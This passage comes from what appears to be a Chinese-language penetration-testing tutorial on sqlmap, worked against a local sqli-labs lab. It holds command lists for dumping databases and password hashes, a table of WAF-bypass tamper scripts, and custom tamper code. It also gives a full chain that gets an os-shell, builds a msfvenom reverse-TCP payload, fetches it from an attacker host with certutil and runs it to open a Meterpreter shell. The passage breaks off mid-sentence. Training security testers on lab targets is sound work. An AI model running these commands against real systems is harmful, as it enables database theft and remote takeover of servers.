class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 基本语法</span><br><span class="line">sqlmap -r sql.txt  # sql.txt是我们抓取的 http 请求包</span><br><span class="line">sqlmap -r sql.txt -p username  # 指定参数，请求包中存在多个参数，根据前期探测已知注入点为 username，所以可利用 -p 指定参数，减少不必要的探测</span><br><span class="line">sqlmap -u &quot;http://www.xxx.com/username/admin*&quot;         # 已知注入参数，可以在其后面加个*来让sqlmap对其注入，post包中json数据也可使用该*号</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;   # 探测该url是否存在漏洞，实际探测 id 参数是否存在注入</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --cookie=&quot;登录抓取的cookie&quot;   # 当该网站需要登录时，探测该url是否存在漏洞</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;  # 抓取其post提交的数据填入进行探测</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --users      # 查看数据库的所有用户</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --passwords  # 查看数据库用户名的密码</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;  --dbs       # 查看所有数据库</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;  --tables    # 查看所有数据表</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;  --columns   # 查看数据库中所有列</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;  --current-db         # 查看当前数据库</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D 数据库名 --tables       # 查看指定数据库中的所有表</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D 数据库名 -T 数据表名 --columns # 查看指定数据库中指定表中的所有列</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D 数据库名 -T 数据表名 -C 数据列 --dump  # 查看指定数据库中的指定表中指定列的所有数据</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D 数据库名 -T 数据表名 -C 数据列 --dump --start 1 --stop 10  # 查看指定数据库中的指定表中指定列的前10条数据</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D security -T users --dump-all # 查看数据库security中的users表中的所有数据</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D security --dump-all   # 查看数据库security中的所有数据</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --dump-all  # 查看该数据库中的所有数据</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --tamper=space2comment.py  # 指定脚本进行过滤，用/**/代替空格</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --level=5 --risk=3 # 探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --dbms=&quot;MySQL&quot;     # 指定其数据库为mysql</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --proxy=&quot;http://192.168.114.144:8080&quot;    #指定代理</span><br><span class="line">当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --technique T    # 指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，也可以直接手工指定，-t效果一样。</span><br><span class="line"></span><br><span class="line"># 命令执行</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --sql-shell  # 执行指定的sql语句</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --os-shell/--os-cmd   # 执行--os-shell命令，获取目标服务器权限</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --os-pwn   # 执行--os-pwn命令，将目标权限弹到MSF上</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --file-read &quot;c:/test.txt&quot; # 读取目标服务器C盘下的test.txt文件</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --file-write  test.txt  --file-dest &quot;e:/hack.txt&quot;  # 将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt</span><br><span class="line">sqlmap -d &quot;mysql://root:root@192.168.114.14430:3306/mysql&quot; --os-shell   # 知道网站的账号密码直接连接</span><br></pre></td></tr></table></figure></div><h2 id="四、Temper脚本"><a href="#四、Temper脚本" class="headerlink" title="四、Temper脚本"></a>四、Temper脚本</h2><h3 id="sqlmap自带脚本"><a href="#sqlmap自带脚本" class="headerlink" title="sqlmap自带脚本"></a>sqlmap自带脚本</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">| temper                       | function                                                     |</span><br><span class="line">| ---------------------------- | :----------------------------------------------------------- |</span><br><span class="line">| apostrophemask.py            | 用UTF-8全角字符替换&#x27;（例如&#x27;-&gt;％EF％BC％87）                  |</span><br><span class="line">| apostrophenullencode.py      | 用双unicode替换&#x27;（例如&#x27;-&gt;％00％27）                          |</span><br><span class="line">| appendnullbyte.py            | 在payload的末尾附加NULL字节字符（％00）                      |</span><br><span class="line">| base64encode.py              | 对payload中的所有字符进行base64编码                          |</span><br><span class="line">| between.py                   | 用运算符（&#x27;&gt;&#x27;）替换&#x27;NOT BETWEEN 0 AND＃&#x27;，用运算符（&#x27;=&#x27;）替换&#x27;BETWEEN＃AND＃&#x27; |</span><br><span class="line">| bluecoat.py                  | 用随机空白字符替换语句后的空格字符，之后用运算符LIKE替换字符&#x27;=&#x27; |</span><br><span class="line">| chardoubleencode.py          | 对payload中的所有字符进行双重URL编码（例如SELECT-&gt;％2553％2545％254C％2545％2543％2554） |</span><br><span class="line">| charencode.py                | 对payload中所有字符进行URL编码（例如SELECT-&gt;％53％45％4C％45％43％54） |</span><br><span class="line">| charunicodeencode.py         | 对payload中的所有字符进行unicode编码（例如SELECT-&gt;％u0053％u0045％u004C％u0045％u0043％u0054） |</span><br><span class="line">| charunicodeescape.py         | 使用Unicode转义payload中的未编码字符（例如SELECT-&gt;\u0053\u0045\u004C\u0045\u0043\u0054） |</span><br><span class="line">| commalesslimit.py            | 用&#x27;LIMIT N OFFSET M&#x27;替换（MySQL）实例，例如&#x27;LIMIT M，N&#x27;      |</span><br><span class="line">| commalessmid.py              | 用&#x27;MID（A FROM B FOR C）&#x27;替换（MySQL）实例，例如&#x27;MID（A，B，C）&#x27; |</span><br><span class="line">| commentbeforeparentheses.py  | 在括号前加（内联）注释（例如（（-&gt;/**/（）                   |</span><br><span class="line">| concat2concatws.py           | 用&#x27;CONCAT_WS（MID（CHAR（0），0，0），A，B）&#x27;替换（MySQL）实例，例如&#x27;CONCAT（A，B）&#x27; 。 |</span><br><span class="line">| equaltolike.py               | 将（&#x27;=&#x27;）运算符替换为&#x27;LIKE&#x27;                                  |</span><br><span class="line">| escapequotes.py              | 斜杠转义单引号和双引号（例如&#x27;-&gt; \&#x27;）                         |</span><br><span class="line">| great.py                     | 替换运算符（&#x27;&gt;&#x27; ）和&#x27;GREATEST&#x27;对应                           |</span><br><span class="line">| Halfversionedmorekeywords.py | 在每个关键字前添加mysql注释                                  |</span><br><span class="line">| hex2char.py                  | 替换每个（MySQL）0x等效的CONCAT（CHAR（），...）编码字符串   |</span><br><span class="line">| htmlencode.py                | 用HTML编码（使用代码点）所有非字母数字字符（例如&#x27;-&gt;&#x27;）       |</span><br><span class="line">| ifnull2casewhenisnull.py     | 绕过对 IFNULL 过滤,替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’ |</span><br><span class="line">| ifnull2ifisnull.py           | 用&#x27;IF（ISNULL（A），B）替换&#x27;IFNULL（A，B）&#x27;之类的实例，A）&#x27;对应 |</span><br><span class="line">| informationschemacomment.py  | 在所有出现的（MySQL）“information_schema”标识符的末尾添加一个内联注释（/ ** /） |</span><br><span class="line">| least.py                     | 用&#x27;LEAST&#x27;对应替换运算符（&#x27;&gt;&#x27;）                               |</span><br><span class="line">| lowercase.py                 | 用小写替换每个关键字字符（例如SELECT-&gt;select）               |</span><br><span class="line">| luanginx.py                  | LUA-NginxWAF绕过（例如Cloudflare）                           |</span><br><span class="line">| modsecurityversioned.py      | 包含带有（MySQL）版本注释的完整查询                          |</span><br><span class="line">| modsecurityzeroversioned.py  | 包含带有（MySQL）零版本注释的完整查询                        |</span><br><span class="line">| multiplespaces.py            | 在SQL关键字周围添加多个空格（&#x27;&#x27;）                            |</span><br><span class="line">| overlongutf8.py              | 将payload中的所有（非字母数字）字符转换为超长UTF8（例如&#x27;-&gt;％C0％A7） |</span><br><span class="line">| overlongutf8more.py          | 将payload中所有字符转换为超长UTF8（例如SELECT-&gt;％C1％93％C1％85％C1％8C％C1％85％C1％83％C1％94） |</span><br><span class="line">| percent.py                   | 在每个字符前面添加一个百分号（&#x27;％&#x27;） （例如SELECT-&gt;％S％E％L％E％C％T） |</span><br><span class="line">| plus2concat.py               | 替换运算符（&#x27;+&#x27;）与（MsSQL）函数CONCAT（）对应               |</span><br><span class="line">| plus2fnconcat.py             | 用（MsSQL）ODBC函数&#123;fn CONCAT（）&#125;替换为（&#x27;+&#x27;）              |</span><br><span class="line">| randomcase.py                | 用随机大小写值替换每个关键字字符（例如SELECT-&gt; SEleCt）      |</span><br><span class="line">| randomcomments.py            | 在SQL关键字内添加随机内联注释（例如SELECT-&gt; S/**/E/**/LECT） |</span><br><span class="line">| sp_password.py               | 将（MsSQL）函数&#x27;sp_password&#x27;附加到payload的末尾，以便从DBMS日志中自动进行混淆 |</span><br><span class="line">| space2comment.py             | 空格替换为/**_**/                                            |</span><br><span class="line">| space2dash.py                | 空格替换为-加随机字符                                        |</span><br><span class="line">| space2hash.py                | 空格替换为#加随机字符                                        |</span><br><span class="line">| space2morecomment.py         | 空格替换为/**_**/                                            |</span><br><span class="line">| space2morehash.py            | 空格替换为#加随机字符及换行符                                |</span><br><span class="line">| space2mssqlblank.py          | 空格替换为其他空符号（MsSQL）                                |</span><br><span class="line">| space2mssqlhash.py           | 空格替换为%23%0A(MsSQL)                                      |</span><br><span class="line">| space2mysqlblank.py          | 空格替换为其它空符号（Mysql）                                |</span><br><span class="line">| space2mysqldash.py           | 替换空格字符（&#x27;&#x27;）（’–‘）后跟一个破折号注释一个换行（’n’）   |</span><br><span class="line">| space2plus.py                | 用加号（&#x27;+&#x27;）替换空格字符（&#x27;&#x27;）                              |</span><br><span class="line">| space2randomblank.py         | 用空格中的随机空白字符替换空格字符（&#x27;&#x27;）有效的替代字符集     |</span><br><span class="line">| substring2leftright.py       | 用LEFT和RIGHT替换PostgreSQL SUBSTRING                        |</span><br><span class="line">| symbolicologic.py            | 用符号（&amp;&amp;和\|\|）替换AND和OR逻辑运算符                      |</span><br><span class="line">| unionalltounion.py           | 用UNION SELECT替换UNION ALL SELECT                           |</span><br><span class="line">| unmagicquotes.py             | 用多字节组合％BF％27替换引号字符（&#x27;），并在末尾添加通用注释  |</span><br><span class="line">| uppercase.py-                | 用大写值替换每个关键字字符（例如select -&gt; SELECT）           |</span><br><span class="line">| varnish.py                   | 添加HTTP标头&#x27;X-originating-IP&#x27;以绕过Varnish防火墙            |</span><br><span class="line">| versionedkeywords.py         | 用注释封装每个非函数的关键字                                 |</span><br><span class="line">| versionedmorekeywords.py     | 将每个关键字包含（MySQL）版本注释                            |</span><br><span class="line">| versionedmorekeywords.py     | 将每个关键字包含（MySQL）版本注释                            |</span><br><span class="line">| xforwardedfor.py             | 添加伪造的HTTP标头&#x27;X-Forwarded-For                           |</span><br></pre></td></tr></table></figure></div><br/><h3 id="Temper自编写"><a href="#Temper自编写" class="headerlink" title="Temper自编写"></a>Temper自编写</h3><p>Sqlmap 支持自编写 temper ，自带例子 base64encode.py</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Base64-encodes all characters in a given payload</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&quot;1&#x27; AND SLEEP(5)#&quot;)</span></span><br><span class="line"><span class="string">    &#x27;MScgQU5EIFNMRUVQKDUpIw==&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encodeBase64(payload, binary=<span class="literal">False</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure></div><p>自定制，将 <code>空格</code> ,替换为 <code>/**/</code>,将 <code>select</code> 替换为 <code>Select</code>, <code>SLEEP</code> 替换为 <code>Sleep</code>,然后将此脚本放置到 sqlmap 的 temper 目录下，然后调用参数 –temper xxx.py 即可</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"><span class="keyword">return</span> payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>).replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;Select&quot;</span>).replace(<span class="string">&quot;SLEEP&quot;</span>,<span class="string">&quot;Sleep&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="五、具体利用"><a href="#五、具体利用" class="headerlink" title="五、具体利用"></a>五、具体利用</h2><p>这边利用 sqli-lab 环境作为靶场环境，具体搭建请自行参考网上文章，或者直接 docker pull 一个，这里不再赘述。</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029161848191.png" data-caption="image-20221029161848191"><img src="/../images/sqlmap/image-20221029161848191.png" alt="image-20221029161848191"></a></p><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p>1、直接对url进行探测是否存在漏洞 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot;</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029161942962.png" data-caption="image-20221029161942962"><img src="/../images/sqlmap/image-20221029161942962.png" alt="image-20221029161942962"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165027147.png" data-caption="image-20221029165027147"><img src="/../images/sqlmap/image-20221029165027147.png" alt="image-20221029165027147"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165138414.png" data-caption="image-20221029165138414"><img src="/../images/sqlmap/image-20221029165138414.png" alt="image-20221029165138414"></a></p><p>2、查询其数据库 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; --dbs</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165340377.png" data-caption="image-20221029165340377"><img src="/../images/sqlmap/image-20221029165340377.png" alt="image-20221029165340377"></a></p><p>3、众所周知 sqli-lab 数据库为 security，我们直接查询其数据表 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; -D security --tables</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165559549.png" data-caption="image-20221029165559549"><img src="/../images/sqlmap/image-20221029165559549.png" alt="image-20221029165559549"></a></p><p>4、对数据表中的 users 数据列进行查询 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; -D security -T users --columns</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165819852.png" data-caption="image-20221029165819852"><img src="/../images/sqlmap/image-20221029165819852.png" alt="image-20221029165819852"></a></p><p>5、查询 usermane 数据列中的所有数据，查询到有13个用户名 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; -D security -T users -C username --dump</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170103643.png" data-caption="image-20221029170103643"><img src="/../images/sqlmap/image-20221029170103643.png" alt="image-20221029170103643"></a></p><p>6、继续查询 password 数据列中的数据 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; -D security -T users -C password --dump</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170237202.png" data-caption="image-20221029170237202"><img src="/../images/sqlmap/image-20221029170237202.png" alt="image-20221029170237202"></a></p><p>至此，sqlmap基本的数据查询就已经完成了，可通过查询出来的账号密码进行后台登录，寻找下一个漏洞点深一步测试。</p><h3 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h3><p>在日常的渗透中，有时候因为查询数据时间过长，我们习惯得到注入点后，查询其是否存在 dba 权限，若是 dba 权限则可进一步获取交互 shell。这里主要接扫几种进一步利用方式：–os-shell、–sql-shell、–file-read、–file-write、–file-dest。</p><p>1、查询是否是 dba 权限 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; --is-dba</code>，这里显示 DBA：False 则说明不是 DBA权限，则无法进一步利用。</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170655721.png" data-caption="image-20221029170655721"><img src="/../images/sqlmap/image-20221029170655721.png" alt="image-20221029170655721"></a></p><p>我们更换关卡为第5关，尝试利用 DBA 进一步测试 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-5/?id=1&quot; --is-dba</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170833247.png" data-caption="image-20221029170833247"><img src="/../images/sqlmap/image-20221029170833247.png" alt="image-20221029170833247"></a></p><p>DBA：True，证明为 dba 权限</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170933044.png" data-caption="image-20221029170933044"><img src="/../images/sqlmap/image-20221029170933044.png" alt="image-20221029170933044"></a></p><h4 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h4><p>–os-shell，直接获取数据库 shell(相当于获取数据库服务器权限，可进行命令执行）,上传webshell等操作</p><p><strong>利用条件：</strong></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MySQL root账号权限，即配置MySQL连接的账号为root账号，不是root账号具备root权限也可</span><br><span class="line">GPC配置关闭，能使用单引号</span><br><span class="line">有网站的绝对路径，且具备可以在文件夹写入文件的权限</span><br><span class="line">没有配置secure-file-priv属性</span><br></pre></td></tr></table></figure></div><p>1、获取 –os-shell</p><p><code>python sqlmap.py -u &quot;http://www.sqli-labs-funsiooo.com:8001/Less-7/?id=1&quot; --os-shell</code> 默认为 PHP ，可手动选择数字</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029172347308.png" data-caption="image-20221029172347308"><img src="/../images/sqlmap/image-20221029172347308.png" alt="image-20221029172347308"></a></p><p>输入绝对路径，实战中可通过网站报错、信息泄露等手段获取网站路径</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029190033776.png" data-caption="image-20221029190033776"><img src="/../images/sqlmap/image-20221029190033776.png" alt="image-20221029190033776"></a></p><p>环境符合，获取 os-shell</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029190102891.png" data-caption="image-20221029190102891"><img src="/../images/sqlmap/image-20221029190102891.png" alt="image-20221029190102891"></a></p><p>通过 os-shell 可执行系统命令</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029190835758.png" data-caption="image-20221029190835758"><img src="/../images/sqlmap/image-20221029190835758.png" alt="image-20221029190835758"></a></p><p>2、通过 os-shell 上传木马，首先在 VPS 上放置一个木马，通过 os-shell 利用 sqlmap 调用系统 certutil.exe 远程下载木马，然后执行上线，下图为攻击机地址。</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029191222590.png" data-caption="image-20221029191222590"><img src="/../images/sqlmap/image-20221029191222590.png" alt="image-20221029191222590"></a></p><p>生成msf木马</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.130 LPORT=2333 -f exe -o /home/funsiooo/2333.exe</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029191710336.png" data-caption="image-20221029191710336"><img src="/../images/sqlmap/image-20221029191710336.png" alt="image-20221029191710336"></a></p><p>利用 Python 在生成 msf 木马路径下开启临时 web 服务</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029192006003.png" data-caption="image-20221029192006003"><img src="/../images/sqlmap/image-20221029192006003.png" alt="image-20221029192006003"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029192030597.png" data-caption="image-20221029192030597"><img src="/../images/sqlmap/image-20221029192030597.png" alt="image-20221029192030597"></a></p><p>攻击机 msf 处进行监听</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.114.140</span><br><span class="line">lhost =&gt; 192.168.114.140</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 2333</span><br><span class="line">lport =&gt; 2333</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029192650298.png" data-caption="image-20221029192650298"><img src="/../images/sqlmap/image-20221029192650298.png" alt="image-20221029192650298"></a></p><p>在 sqlmap 处调用 windwos 自带的 certutil.exe 远程下载 msf shell，最后通过命令执行 msf shell 反弹shell</p><p>远程下载2333.exe(注意y&#x2F;n&#x2F;a选择)</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; certutil.exe -urlcache -split -f http://192.168.114.140:8000/2333.exe C:\Users\Public\2333.exe</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029193805046.png" data-caption="image-20221029193805046"><img src="/../images/sqlmap/image-20221029193805046.png" alt="image-20221029193805046"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029193839251.png" data-caption="image-20221029193839251"><img src="/../images/sqlmap/image-20221029193839251.png" alt="image-20221029193839251"></a></p><p>执行 2333.exe 木马程序,获取反弹 msf shell</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; C:\Users\Public\2333.exe</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029194114549.png" data-caption="image-20221029194114549"><img src="/../images/sqlmap/image-20221029194114549.png" alt="image-20221029194114549"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029194152525.png" data-caption="image-20221029194152525"><img src="/../images/sqlmap/image-20221029194152525.png" alt="image-20221029194152525"></a></p><h4 id="sql-shell"><a href="#sql-shell" class="headerlink" title="sql-shell"></a>sql-shell</h4><p>–sql-shell，数据库交互模式 shell，执行数据库命令，上传shell，注意：该关卡通关需要secure_file_priv属性为空，若为NULL不能写入，具体参数解析或查询方法看后面有解析</p><p>若为NULL，则需要打开phpstudy\MySQL\my.ini文件，在其中加上一句：secure_file_priv&#x3D;”&#x2F;“</p><p><strong>利用条件：</strong></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写入权限</span><br><span class="line">知道网站绝对路径</span><br></pre></td></tr></table></figure></div><p>1、获取 sql-shell <code>python sqlmap.py -u &quot;http://www.sqli-labs-funsiooo.com:8001/Less-7/?id=1&quot; --sql-shell</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029174714532.png" data-caption="image-20221029174714532"><img src="/../images/sqlmap/image-20221029174714532.png" alt="image-20221029174714532"></a></p><p>查询数据库版本 <code>select @@version;</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029174855562.png" data-caption="image-20221029174855562"><img src="/../images/sqlmap/image-20221029174855562.png" alt="image-20221029174855562"></a></p><p>查看目录和 secure_file_priv 属性以及数据库路径和 Mysql 